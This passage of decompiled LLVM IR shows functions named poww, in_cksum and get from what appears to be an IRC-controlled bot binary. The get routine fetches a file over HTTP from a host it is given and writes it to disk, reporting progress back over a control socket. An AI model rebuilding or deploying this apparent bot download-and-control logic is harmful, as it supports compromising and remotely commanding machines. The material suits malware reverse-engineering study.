  %v0_10000c68 = call i32 @__GI_exit()
  br label %dec_label_pc_10000c6c

dec_label_pc_10000c6c:                            ; preds = %dec_label_pc_10000c58, %dec_label_pc_10000c64
  %v2_10000c74 = add i32 %v2_10000b6c, 60
  %v3_10000c7c = add i32 %v2_10000c74, %v4_10000c40
  %v4_10000c7c = inttoptr i32 %v3_10000c7c to i8*
  store i8 0, i8* %v4_10000c7c, align 1
  %v1_10000c84 = add i32 %v2_10000b6c, -1
  %v2_10000c8c = add i32 %v1_10000c84, %v4_10000c40
  %v1_10000c90 = add i32 %v2_10000c8c, 60
  %v2_10000c90 = inttoptr i32 %v1_10000c90 to i8*
  %v3_10000c90 = load i8, i8* %v2_10000c90, align 1
  %v3_10000c98 = icmp eq i8 %v3_10000c90, 10
  br i1 %v3_10000c98, label %dec_label_pc_10000cc0, label %dec_label_pc_10000ca0

dec_label_pc_10000ca0:                            ; preds = %dec_label_pc_10000c6c
  %v3_10000cb0 = load i8, i8* %v2_10000c90, align 1
  %v3_10000cb8 = icmp eq i8 %v3_10000cb0, 13
  br i1 %v3_10000cb8, label %dec_label_pc_10000cc0, label %dec_label_pc_10000cd8

dec_label_pc_10000cc0:                            ; preds = %dec_label_pc_10000ca0, %dec_label_pc_10000c6c
  store i8 0, i8* %v2_10000c90, align 1
  br label %dec_label_pc_10000cd8

dec_label_pc_10000cd8:                            ; preds = %dec_label_pc_10000ca0, %dec_label_pc_10000cc0
  %v1_10000cdc = add i32 %v2_10000b6c, -2
  %v2_10000ce4 = add i32 %v1_10000cdc, %v4_10000c40
  %v1_10000ce8 = add i32 %v2_10000ce4, 60
  %v2_10000ce8 = inttoptr i32 %v1_10000ce8 to i8*
  %v3_10000ce8 = load i8, i8* %v2_10000ce8, align 1
  %v3_10000cf0 = icmp eq i8 %v3_10000ce8, 10
  br i1 %v3_10000cf0, label %dec_label_pc_10000d18, label %dec_label_pc_10000cf8

dec_label_pc_10000cf8:                            ; preds = %dec_label_pc_10000cd8
  %v3_10000d08 = load i8, i8* %v2_10000ce8, align 1
  %v3_10000d10 = icmp eq i8 %v3_10000d08, 13
  br i1 %v3_10000d10, label %dec_label_pc_10000d18, label %dec_label_pc_10000d30

dec_label_pc_10000d18:                            ; preds = %dec_label_pc_10000cf8, %dec_label_pc_10000cd8
  store i8 0, i8* %v2_10000ce8, align 1
  br label %dec_label_pc_10000d30

dec_label_pc_10000d30:                            ; preds = %dec_label_pc_10000cf8, %dec_label_pc_10000d18
  %v3_10000d34 = load i32, i32* @global_var_10045190.32, align 4
  %v6_10000d54 = call i32 @Send(i32 %v4_10000af4, i32 ptrtoint ([25 x i8]* @global_var_1002a0cc.33 to i32), i32 %v2_10000c2c, i32 %v3_10000d34)
  store i32 268438880, i32* @lr, align 4
  %v1_10000d5c = call i32 @close(i32 %v4_10000af4)
  store i32 ptrtoint ([3 x i8]* @global_var_10000d68.34 to i32), i32* @lr, align 4
  %v1_10000d64 = call i32 @close(i32 %v3_10000a34)
  %v0_10000d6c = call i32 @__GI_exit()
  br label %dec_label_pc_10000d70

dec_label_pc_10000d70:                            ; preds = %dec_label_pc_10000ac8, %dec_label_pc_10000aac, %dec_label_pc_10000a50, %entry, %dec_label_pc_10000d30
  %v0_10000d84 = phi i32 [ 0, %dec_label_pc_10000ac8 ], [ -1, %dec_label_pc_10000aac ], [ -1, %dec_label_pc_10000a50 ], [ -1, %entry ], [ %v0_10000d6c, %dec_label_pc_10000d30 ]
  ret i32 %v0_10000d84

; uselistorder directives
  uselistorder i8* %v2_10000ce8, { 1, 0, 2 }
  uselistorder i8* %v2_10000c90, { 1, 0, 2 }
  uselistorder i32 %v4_10000c40, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_10000c08, { 0, 2, 1 }
  uselistorder i32 %v1_10000b48, { 1, 0 }
  uselistorder i32 %v1_10000b80, { 1, 0 }
  uselistorder i32* %v1_10000b78, { 1, 0, 2 }
  uselistorder i32 %v2_10000b18, { 1, 0, 2 }
  uselistorder i32 %v4_10000af4, { 2, 3, 4, 5, 6, 1, 0, 7 }
  uselistorder i32* %stack_var_-1216, { 1, 0 }
  uselistorder label %dec_label_pc_10000d70, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10000d30, { 1, 0 }
  uselistorder label %dec_label_pc_10000cd8, { 1, 0 }
  uselistorder label %dec_label_pc_10000c6c, { 1, 0 }
  uselistorder label %dec_label_pc_10000bf0, { 1, 0 }
  uselistorder label %dec_label_pc_10000b18, { 1, 0 }
}

define i32 @poww(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_10000da8 = icmp eq i32 %arg2, 0
  br i1 %v3_10000da8, label %dec_label_pc_10000db0, label %dec_label_pc_10000dbc

dec_label_pc_10000db0:                            ; preds = %entry
  br label %dec_label_pc_10000df8

dec_label_pc_10000dbc:                            ; preds = %entry
  %v3_10000dc0 = icmp eq i32 %arg2, 1
  br i1 %v3_10000dc0, label %dec_label_pc_10000dc8, label %dec_label_pc_10000dd4

dec_label_pc_10000dc8:                            ; preds = %dec_label_pc_10000dbc
  br label %dec_label_pc_10000df8

dec_label_pc_10000dd4:                            ; preds = %dec_label_pc_10000dbc
  %v1_10000dd8 = add i32 %arg2, -1
  %v2_10000de4 = call i32 @poww(i32 %arg1, i32 %v1_10000dd8)
  %v2_10000df0 = mul i32 %v2_10000de4, %arg1
  br label %dec_label_pc_10000df8

dec_label_pc_10000df8:                            ; preds = %dec_label_pc_10000dc8, %dec_label_pc_10000db0, %dec_label_pc_10000dd4
  %stack_var_-16.0 = phi i32 [ 1, %dec_label_pc_10000db0 ], [ %arg1, %dec_label_pc_10000dc8 ], [ %v2_10000df0, %dec_label_pc_10000dd4 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000df8, { 2, 0, 1 }
}

define i32 @in_cksum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10000e845 = icmp sgt i32 %arg2, 1
  br i1 %v2_10000e845, label %dec_label_pc_10000e50, label %dec_label_pc_10000e8c

dec_label_pc_10000e50:                            ; preds = %entry, %dec_label_pc_10000e50
  %stack_var_-24.09 = phi i32 [ %v1_10000e78, %dec_label_pc_10000e50 ], [ %arg2, %entry ]
  %stack_var_-28.08 = phi i16* [ %v5_10000e70, %dec_label_pc_10000e50 ], [ %arg1, %entry ]
  %stack_var_-32.07 = phi i32 [ %v2_10000e60, %dec_label_pc_10000e50 ], [ 0, %entry ]
  %v4_10000e50 = ptrtoint i16* %stack_var_-28.08 to i32
  %v2_10000e54 = load i16, i16* %stack_var_-28.08, align 2
  %v3_10000e54 = zext i16 %v2_10000e54 to i32
  %v2_10000e60 = add i32 %v3_10000e54, %stack_var_-32.07
  %v1_10000e6c = add i32 %v4_10000e50, 2
  %v5_10000e70 = inttoptr i32 %v1_10000e6c to i16*
  %v1_10000e78 = add nsw i32 %stack_var_-24.09, -2
  %v2_10000e84 = icmp sgt i32 %v1_10000e78, 1
  br i1 %v2_10000e84, label %dec_label_pc_10000e50, label %dec_label_pc_10000e80.dec_label_pc_10000e8c_crit_edge

dec_label_pc_10000e80.dec_label_pc_10000e8c_crit_edge: ; preds = %dec_label_pc_10000e50
  %v3_10000e84.le = icmp eq i32 %v1_10000e78, 1
  br i1 %v3_10000e84.le, label %dec_label_pc_10000e98, label %dec_label_pc_10000ec0

dec_label_pc_10000e8c:                            ; preds = %entry
  %v3_10000e846 = icmp eq i32 %arg2, 1
  br i1 %v3_10000e846, label %dec_label_pc_10000e98, label %dec_label_pc_10000ec0

dec_label_pc_10000e98:                            ; preds = %dec_label_pc_10000e80.dec_label_pc_10000e8c_crit_edge, %dec_label_pc_10000e8c
  %stack_var_-28.0.lcssa17 = phi i16* [ %v5_10000e70, %dec_label_pc_10000e80.dec_label_pc_10000e8c_crit_edge ], [ %arg1, %dec_label_pc_10000e8c ]
  %stack_var_-32.0.lcssa16 = phi i32 [ %v2_10000e60, %dec_label_pc_10000e80.dec_label_pc_10000e8c_crit_edge ], [ 0, %dec_label_pc_10000e8c ]
  %v1_10000ea0 = bitcast i16* %stack_var_-28.0.lcssa17 to i8*
  %v2_10000ea0 = load i8, i8* %v1_10000ea0, align 1
  %v3_10000ea0 = zext i8 %v2_10000ea0 to i32
  %v2_10000eb8 = add i32 %v3_10000ea0, %stack_var_-32.0.lcssa16
  br label %dec_label_pc_10000ec0

dec_label_pc_10000ec0:                            ; preds = %dec_label_pc_10000e80.dec_label_pc_10000e8c_crit_edge, %dec_label_pc_10000e8c, %dec_label_pc_10000e98
  %stack_var_-32.1 = phi i32 [ %v2_10000eb8, %dec_label_pc_10000e98 ], [ 0, %dec_label_pc_10000e8c ], [ %v2_10000e60, %dec_label_pc_10000e80.dec_label_pc_10000e8c_crit_edge ]
  %v4_10000ec4 = sdiv i32 %stack_var_-32.1, 65536
  %v1_10000ecc = urem i32 %stack_var_-32.1, 65536
  %v2_10000ed0 = add nsw i32 %v4_10000ec4, %v1_10000ecc
  %v4_10000edc = sdiv i32 %v2_10000ed0, 65536
  %v2_10000ee4 = add nsw i32 %v4_10000edc, %v2_10000ed0
  %v2_10000ef018 = urem i32 %v2_10000ee4, 65536
  %v1_10000efc = xor i32 %v2_10000ef018, 65535
  ret i32 %v1_10000efc

; uselistorder directives
  uselistorder i32 %v2_10000ed0, { 1, 0 }
  uselistorder i32 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %v1_10000e78, { 0, 2, 1 }
  uselistorder i32 %v2_10000e60, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10000ec0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10000e98, { 1, 0 }
  uselistorder label %dec_label_pc_10000e50, { 1, 0 }
}

define i32 @get(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %stack_var_-4140 = alloca i32, align 4
  %stack_var_-5176 = alloca i32, align 4
  %stack_var_-5180 = alloca i32, align 4
  %stack_var_-5224 = alloca i32, align 4
  %stack_var_-5164 = alloca i32, align 4
  %stack_var_-5232 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10000f20 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10000f20, i32* %stack_var_-5232, align 4
  %v1_10000f4c = call i32 @mfork(i32 %arg2)
  %v3_10000f54 = icmp eq i32 %v1_10000f4c, 0
  br i1 %v3_10000f54, label %dec_label_pc_10000f5c, label %dec_label_pc_100014f4

dec_label_pc_10000f5c:                            ; preds = %entry
  %v2_10000f60 = icmp sgt i32 %arg3, 1
  br i1 %v2_10000f60, label %dec_label_pc_10000f88, label %dec_label_pc_10000f68

dec_label_pc_10000f68:                            ; preds = %dec_label_pc_10000f5c
  %v6_10000f7c = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_1002a0e8.35 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_10000f84 = call i32 @__GI_exit()
  br label %dec_label_pc_10000f88

dec_label_pc_10000f88:                            ; preds = %dec_label_pc_10000f5c, %dec_label_pc_10000f68
  store i32 268439448, i32* @lr, align 4
  %v3_10000f94 = call i32 @socket(i32 2, i32 1, i32 0)
  %v4_10000fa8 = icmp eq i32 %v3_10000f94, -1
  br i1 %v4_10000fa8, label %dec_label_pc_10000fb0, label %dec_label_pc_10000fd0

dec_label_pc_10000fb0:                            ; preds = %dec_label_pc_10000f88
  %v6_10000fc4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1002a10c.38 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_10000fcc = call i32 @__GI_exit()
  br label %dec_label_pc_10000fd0

dec_label_pc_10000fd0:                            ; preds = %dec_label_pc_10000f88, %dec_label_pc_10000fb0
  %v1_10000fd4 = add i32 %arg4, 4
  %v1_10000fd8 = inttoptr i32 %v1_10000fd4 to i32*
  %v2_10000fd8 = load i32, i32* %v1_10000fd8, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1002a134.40 to i32), i32* @r4, align 4
  %v4_10000fec = inttoptr i32 %v2_10000fd8 to i8*
  %v5_10000fec = call i32 @__GI_strncmp(i8* %v4_10000fec, i32 ptrtoint ([8 x i8]* @global_var_1002a134.40 to i32), i32 7)
  %v3_10000ff4 = icmp eq i32 %v5_10000fec, 0
  %v2_10001004 = load i32, i32* %v1_10000fd8, align 4
  br i1 %v3_10000ff4, label %dec_label_pc_10000ffc, label %dec_label_pc_10001020

dec_label_pc_10000ffc:                            ; preds = %dec_label_pc_10000fd0
  %v1_10001008 = add i32 %v2_10001004, 7
  %v2_1000100c = ptrtoint i32* %stack_var_-5164 to i32
  %v2_10001018 = inttoptr i32 %v1_10001008 to i8*
  %v3_10001018 = call i32 @strcpy(i32 %v2_1000100c, i8* %v2_10001018)
  br label %dec_label_pc_1000103c

dec_label_pc_10001020:                            ; preds = %dec_label_pc_10000fd0
  %v2_1000102c = ptrtoint i32* %stack_var_-5164 to i32
  %v2_10001038 = inttoptr i32 %v2_10001004 to i8*
  %v3_10001038 = call i32 @strcpy(i32 %v2_1000102c, i8* %v2_10001038)
  br label %dec_label_pc_1000103c

dec_label_pc_1000103c:                            ; preds = %dec_label_pc_10000ffc, %dec_label_pc_10001020
  %v2_10001058.pre-phi = phi i32 [ %v2_1000100c, %dec_label_pc_10000ffc ], [ %v2_1000102c, %dec_label_pc_10001020 ]
  %v2_10001074 = ptrtoint i32* %stack_var_-5224 to i32
  store i32 %v2_10001058.pre-phi, i32* @r3, align 4
  %v0_1000106065 = call i32 @__GI_strlen()
  %v2_1000106867 = icmp eq i32 %v0_1000106065, 0
  br i1 %v2_1000106867, label %dec_label_pc_10001054.dec_label_pc_1000108c_crit_edge, label %dec_label_pc_10001070

dec_label_pc_10001048:                            ; preds = %dec_label_pc_10001070
  %v1_1000104c = add i32 %storemerge570, 1
  store i32 %v2_10001058.pre-phi, i32* @r3, align 4
  %v0_10001060 = call i32 @__GI_strlen()
  %v2_10001068 = icmp ult i32 %v1_1000104c, %v0_10001060
  br i1 %v2_10001068, label %dec_label_pc_10001070, label %dec_label_pc_10001054.dec_label_pc_1000108c_crit_edge

dec_label_pc_10001054.dec_label_pc_1000108c_crit_edge: ; preds = %dec_label_pc_1000103c, %dec_label_pc_10001048
  %storemerge5.lcssa = phi i32 [ 0, %dec_label_pc_1000103c ], [ %v1_1000104c, %dec_label_pc_10001048 ]
  %.pre29 = add i32 %storemerge5.lcssa, %v2_10001074
  %.pre30 = add i32 %.pre29, 60
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_1000108c

dec_label_pc_10001070:                            ; preds = %dec_label_pc_1000103c, %dec_label_pc_10001048
  %storemerge570 = phi i32 [ %v1_1000104c, %dec_label_pc_10001048 ], [ 0, %dec_label_pc_1000103c ]
  %v2_10001078 = add i32 %storemerge570, %v2_10001074
  %v1_1000107c = add i32 %v2_10001078, 60
  %v2_1000107c = inttoptr i32 %v1_1000107c to i8*
  %v3_1000107c = load i8, i8* %v2_1000107c, align 1
  %v3_10001084 = icmp eq i8 %v3_1000107c, 47
  br i1 %v3_10001084, label %dec_label_pc_1000108c, label %dec_label_pc_10001048

dec_label_pc_1000108c:                            ; preds = %dec_label_pc_10001070, %dec_label_pc_10001054.dec_label_pc_1000108c_crit_edge
  %storemerge564 = phi i32 [ %storemerge5.lcssa, %dec_label_pc_10001054.dec_label_pc_1000108c_crit_edge ], [ %storemerge570, %dec_label_pc_10001070 ]
  %v4_1000109c.pre-phi = phi i8* [ %.pre31, %dec_label_pc_10001054.dec_label_pc_1000108c_crit_edge ], [ %v2_1000107c, %dec_label_pc_10001070 ]
  store i8 0, i8* %v4_1000109c.pre-phi, align 1
  store i32 2, i32* %stack_var_-5180, align 4
  store i32 80, i32* @r3, align 4
  %v1_100010ac = call i32 @htons(i32 80)
  store i32 268439748, i32* @lr, align 4
  %v1_100010c0 = call i32 @inet_addr(i32 %v2_10001058.pre-phi)
  %v4_100010d4 = icmp eq i32 %v1_100010c0, -1
  br i1 %v4_100010d4, label %dec_label_pc_100010dc, label %dec_label_pc_10001150

dec_label_pc_100010dc:                            ; preds = %dec_label_pc_1000108c
  store i32 268439784, i32* @lr, align 4
  %v1_100010e4 = call i32 @__GI_gethostbyname(i32 %v2_10001058.pre-phi)
  %v3_100010f4 = icmp eq i32 %v1_100010e4, 0
  br i1 %v3_100010f4, label %dec_label_pc_100010fc, label %dec_label_pc_1000111c

dec_label_pc_100010fc:                            ; preds = %dec_label_pc_100010dc
  %v6_10001110 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002a13c.43 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_10001118 = call i32 @__GI_exit()
  br label %dec_label_pc_1000111c

dec_label_pc_1000111c:                            ; preds = %dec_label_pc_100010dc, %dec_label_pc_100010fc
  %v2_10001120 = ptrtoint i32* %stack_var_-5176 to i32
  %v1_10001128 = add i32 %v1_100010e4, 16
  %v2_10001128 = inttoptr i32 %v1_10001128 to i32*
  %v3_10001128 = load i32, i32* %v2_10001128, align 4
  %v1_1000112c = inttoptr i32 %v3_10001128 to i32*
  %v2_1000112c = load i32, i32* %v1_1000112c, align 4
  store i32 %v2_1000112c, i32* %r11.global-to-local, align 4
  %v1_10001134 = add i32 %v1_100010e4, 12
  %v2_10001134 = inttoptr i32 %v1_10001134 to i32*
  %v3_10001134 = load i32, i32* %v2_10001134, align 4
  store i32 %v2_10001120, i32* @r3, align 4
  store i32 %v2_1000112c, i32* @r4, align 4
  store i32 %v3_10001134, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000114c.46 to i32), i32* @lr, align 4
  %v0_10001148 = call i32 @memcpy()
  br label %dec_label_pc_10001158

dec_label_pc_10001150:                            ; preds = %dec_label_pc_1000108c
  store i32 %v1_100010c0, i32* %stack_var_-5176, align 4
  br label %dec_label_pc_10001158

dec_label_pc_10001158:                            ; preds = %dec_label_pc_1000111c, %dec_label_pc_10001150
  %v2_10001170.pre-phi = ptrtoint i32* %stack_var_-5180 to i32
  store i32 268439940, i32* @lr, align 4
  %v3_10001180 = call i32 @connect(i32 %v3_10000f94, i32 %v2_10001170.pre-phi, i32 16)
  %v3_10001188 = icmp eq i32 %v3_10001180, 0
  br i1 %v3_10001188, label %dec_label_pc_100011b0, label %dec_label_pc_10001190

dec_label_pc_10001190:                            ; preds = %dec_label_pc_10001158
  %v6_100011a4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002a164.47 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_100011ac = call i32 @__GI_exit()
  br label %dec_label_pc_100011b0

dec_label_pc_100011b0:                            ; preds = %dec_label_pc_10001158, %dec_label_pc_10001190
  %v2_100011b8 = add i32 %v2_10001058.pre-phi, 1
  %v1_100011bc = add i32 %v2_100011b8, %storemerge564
  store i32 %v2_10001058.pre-phi, i32* %r11.global-to-local, align 4
  %v6_100011dc = call i32 @Send(i32 %v3_10000f94, i32 ptrtoint ([276 x i8]* @global_var_1002a18c.49 to i32), i32 %v1_100011bc, i32 %v2_10001058.pre-phi)
  %v6_100011f4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_1002a2a0.50 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v1_100011fc = add i32 %arg4, 8
  %v1_10001200 = inttoptr i32 %v1_100011fc to i32*
  %v2_10001200 = load i32, i32* %v1_10001200, align 4
  store i32 268440084, i32* @lr, align 4
  %v3_10001210 = call i32 @__GI_fopen(i32 %v2_10001200, i32 ptrtoint ([3 x i8]* @global_var_1002a2bc.51 to i32))
  %v2_1000121c = ptrtoint i32* %stack_var_-4140 to i32
  br label %dec_label_pc_1000121c

dec_label_pc_1000121c:                            ; preds = %dec_label_pc_10001378, %dec_label_pc_100011b0
  store i32 268440116, i32* @lr, align 4
  %v4_10001230 = call i32 @recv(i32 %v3_10000f94, i32 %v2_1000121c, i32 4096, i32 0)
  %tmp58 = icmp slt i32 %v4_10001230, 1
  br i1 %tmp58, label %dec_label_pc_10001398, label %dec_label_pc_10001248

dec_label_pc_10001248:                            ; preds = %dec_label_pc_1000121c
  %v2_1000124c = icmp sgt i32 %v4_10001230, 4095
  br i1 %v2_1000124c, label %dec_label_pc_10001274.lr.ph, label %dec_label_pc_10001254

dec_label_pc_10001254:                            ; preds = %dec_label_pc_10001248
  %v2_1000125c = add i32 %v4_10001230, %v2_10001074
  %v3_10001264 = add i32 %v2_1000125c, 1084
  %v4_10001264 = inttoptr i32 %v3_10001264 to i8*
  store i8 0, i8* %v4_10001264, align 1
  br label %dec_label_pc_10001274.lr.ph

dec_label_pc_10001274.lr.ph:                      ; preds = %dec_label_pc_10001254, %dec_label_pc_10001248
  br label %dec_label_pc_10001274

dec_label_pc_10001274:                            ; preds = %dec_label_pc_10001274.lr.ph, %dec_label_pc_10001378
  %storemerge625 = phi i32 [ 0, %dec_label_pc_10001274.lr.ph ], [ %v1_1000137c, %dec_label_pc_10001378 ]
  %v2_10001280 = add i32 %storemerge625, %v2_1000121c
  store i32 ptrtoint ([5 x i8]* @global_var_1002a2c0.52 to i32), i32* @r4, align 4
  %v4_10001294 = inttoptr i32 %v2_10001280 to i8*
  %v5_10001294 = call i32 @__GI_strncmp(i8* %v4_10001294, i32 ptrtoint ([5 x i8]* @global_var_1002a2c0.52 to i32), i32 4)
  %v3_1000129c = icmp eq i32 %v5_10001294, 0
  br i1 %v3_1000129c, label %dec_label_pc_100012a4, label %dec_label_pc_10001378

dec_label_pc_100012a4:                            ; preds = %dec_label_pc_10001274
  %v1_100012a8 = add i32 %storemerge625, 4
  %v2_1000136c18 = icmp slt i32 %v1_100012a8, %v4_10001230
  br i1 %v2_1000136c18, label %dec_label_pc_100012b4.lr.ph, label %dec_label_pc_10001398

dec_label_pc_100012b4.lr.ph:                      ; preds = %dec_label_pc_100012a4
  %v1_100012c0 = add i32 %v3_10001210, 52
  %v2_100012c0 = inttoptr i32 %v1_100012c0 to i32*
  %v1_100012d0 = add i32 %v3_10001210, 16
  %v2_100012d0 = inttoptr i32 %v1_100012d0 to i32*
  %v1_100012d8 = add i32 %v3_10001210, 28
  %v2_100012d8 = inttoptr i32 %v1_100012d8 to i32*
  br label %dec_label_pc_100012b4

dec_label_pc_100012b4:                            ; preds = %dec_label_pc_100012b4.lr.ph, %dec_label_pc_10001358
  %storemerge721 = phi i32 [ %v1_100012a8, %dec_label_pc_100012b4.lr.ph ], [ %v1_1000135c, %dec_label_pc_10001358 ]
  %v3_100012c0 = load i32, i32* %v2_100012c0, align 4
  %v3_100012c4 = icmp eq i32 %v3_100012c0, 0
  br i1 %v3_100012c4, label %dec_label_pc_10001338, label %dec_label_pc_100012cc

dec_label_pc_100012cc:                            ; preds = %dec_label_pc_100012b4
  %v3_100012d0 = load i32, i32* %v2_100012d0, align 4
  store i32 %v3_100012d0, i32* %r11.global-to-local, align 4
  %v3_100012d8 = load i32, i32* %v2_100012d8, align 4
  %v2_100012dc = icmp ult i32 %v3_100012d0, %v3_100012d8
  br i1 %v2_100012dc, label %dec_label_pc_100012e4, label %dec_label_pc_10001314

dec_label_pc_100012e4:                            ; preds = %dec_label_pc_100012cc
  %v3_100012e8 = load i32, i32* %v2_100012d0, align 4
  store i32 %v3_100012e8, i32* %r11.global-to-local, align 4
  %v2_100012f4 = add i32 %storemerge721, %v2_10001074
  %v1_100012f8 = add i32 %v2_100012f4, 1084
  %v2_100012f8 = inttoptr i32 %v1_100012f8 to i8*
  %v3_100012f8 = load i8, i8* %v2_100012f8, align 1
  %v3_10001300 = inttoptr i32 %v3_100012e8 to i8*
  store i8 %v3_100012f8, i8* %v3_10001300, align 1
  %v0_10001304 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001304 = add i32 %v0_10001304, 1
  store i32 %v1_10001304, i32* %v2_100012d0, align 4
  br label %dec_label_pc_10001358

dec_label_pc_10001314:                            ; preds = %dec_label_pc_100012cc
  %v2_1000131c = add i32 %storemerge721, %v2_10001074
  %v1_10001320 = add i32 %v2_1000131c, 1084
  %v2_10001320 = inttoptr i32 %v1_10001320 to i8*
  %v3_10001320 = load i8, i8* %v2_10001320, align 1
  store i32 ptrtoint (i32* @global_var_10001334.53 to i32), i32* @lr, align 4
  %v4_10001330 = call i32 @putc_unlocked(i8 %v3_10001320, i32 %v3_10001210, i32 %v2_1000131c)
  br label %dec_label_pc_10001358

dec_label_pc_10001338:                            ; preds = %dec_label_pc_100012b4
  %v2_10001340 = add i32 %storemerge721, %v2_10001074
  %v1_10001344 = add i32 %v2_10001340, 1084
  %v2_10001344 = inttoptr i32 %v1_10001344 to i8*
  %v3_10001344 = load i8, i8* %v2_10001344, align 1
  store i32 268440408, i32* @lr, align 4
  %v4_10001354 = call i32 @__GI_fputc(i8 %v3_10001344, i32 %v3_10001210, i32 %v2_10001340)
  br label %dec_label_pc_10001358

dec_label_pc_10001358:                            ; preds = %dec_label_pc_10001314, %dec_label_pc_100012e4, %dec_label_pc_10001338
  %v1_1000135c = add i32 %storemerge721, 1
  %v2_1000136c = icmp slt i32 %v1_1000135c, %v4_10001230
  br i1 %v2_1000136c, label %dec_label_pc_100012b4, label %dec_label_pc_10001398

dec_label_pc_10001378:                            ; preds = %dec_label_pc_10001274
  %v1_1000137c = add nuw nsw i32 %storemerge625, 1
  %v2_1000138c = icmp slt i32 %v1_1000137c, %v4_10001230
  br i1 %v2_1000138c, label %dec_label_pc_10001274, label %dec_label_pc_1000121c

dec_label_pc_10001398:                            ; preds = %dec_label_pc_1000121c, %dec_label_pc_10001358, %dec_label_pc_100012a4
  %v2_100013a0 = load i32, i32* %v1_10001200, align 4
  %v6_100013bc = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1002a2c8.54 to i32), i32 %arg2, i32 %v2_100013a0)
  %v1_10001424 = add i32 %v3_10001210, 52
  %v2_10001424 = inttoptr i32 %v1_10001424 to i32*
  %v1_10001434 = add i32 %v3_10001210, 16
  %v2_10001434 = inttoptr i32 %v1_10001434 to i32*
  %v1_1000143c = add i32 %v3_10001210, 28
  %v2_1000143c = inttoptr i32 %v1_1000143c to i32*
  br label %dec_label_pc_100013c0

dec_label_pc_100013c0:                            ; preds = %dec_label_pc_100014bc, %dec_label_pc_10001398
  store i32 268440536, i32* @lr, align 4
  %v4_100013d4 = call i32 @recv(i32 %v3_10000f94, i32 %v2_1000121c, i32 4096, i32 0)
  %tmp59 = icmp slt i32 %v4_100013d4, 1
  br i1 %tmp59, label %dec_label_pc_100014dc, label %dec_label_pc_100013ec

dec_label_pc_100013ec:                            ; preds = %dec_label_pc_100013c0
  %v2_100013f0 = icmp sgt i32 %v4_100013d4, 4095
  br i1 %v2_100013f0, label %dec_label_pc_10001418.lr.ph, label %dec_label_pc_100013f8

dec_label_pc_100013f8:                            ; preds = %dec_label_pc_100013ec
  %v2_10001400 = add i32 %v4_100013d4, %v2_10001074
  %v3_10001408 = add i32 %v2_10001400, 1084
  %v4_10001408 = inttoptr i32 %v3_10001408 to i8*
  store i8 0, i8* %v4_10001408, align 1
  br label %dec_label_pc_10001418.lr.ph

dec_label_pc_10001418.lr.ph:                      ; preds = %dec_label_pc_100013f8, %dec_label_pc_100013ec
  br label %dec_label_pc_10001418

dec_label_pc_10001418:                            ; preds = %dec_label_pc_10001418.lr.ph, %dec_label_pc_100014bc
  %storemerge817 = phi i32 [ 0, %dec_label_pc_10001418.lr.ph ], [ %v1_100014c0, %dec_label_pc_100014bc ]
  store i32 %v3_10001210, i32* %stack_var_-5224, align 4
  %v3_10001424 = load i32, i32* %v2_10001424, align 4
  %v3_10001428 = icmp eq i32 %v3_10001424, 0
  br i1 %v3_10001428, label %dec_label_pc_1000149c, label %dec_label_pc_10001430

dec_label_pc_10001430:                            ; preds = %dec_label_pc_10001418
  %v3_10001434 = load i32, i32* %v2_10001434, align 4
  store i32 %v3_10001434, i32* %r11.global-to-local, align 4
  %v3_1000143c = load i32, i32* %v2_1000143c, align 4
  %v2_10001440 = icmp ult i32 %v3_10001434, %v3_1000143c
  br i1 %v2_10001440, label %dec_label_pc_10001448, label %dec_label_pc_10001478

dec_label_pc_10001448:                            ; preds = %dec_label_pc_10001430
  %v3_1000144c = load i32, i32* %v2_10001434, align 4
  store i32 %v3_1000144c, i32* %r11.global-to-local, align 4
  %v2_10001458 = add i32 %storemerge817, %v2_10001074
  %v1_1000145c = add i32 %v2_10001458, 1084
  %v2_1000145c = inttoptr i32 %v1_1000145c to i8*
  %v3_1000145c = load i8, i8* %v2_1000145c, align 1
  %v3_10001464 = inttoptr i32 %v3_1000144c to i8*
  store i8 %v3_1000145c, i8* %v3_10001464, align 1
  %v0_10001468 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001468 = add i32 %v0_10001468, 1
  %v3_1000146c = load i32, i32* %stack_var_-5224, align 4
  %v2_10001470 = add i32 %v3_1000146c, 16
  %v3_10001470 = inttoptr i32 %v2_10001470 to i32*
  store i32 %v1_10001468, i32* %v3_10001470, align 4
  br label %dec_label_pc_100014bc

dec_label_pc_10001478:                            ; preds = %dec_label_pc_10001430
  %v2_10001480 = add i32 %storemerge817, %v2_10001074
  %v1_10001484 = add i32 %v2_10001480, 1084
  %v2_10001484 = inttoptr i32 %v1_10001484 to i8*
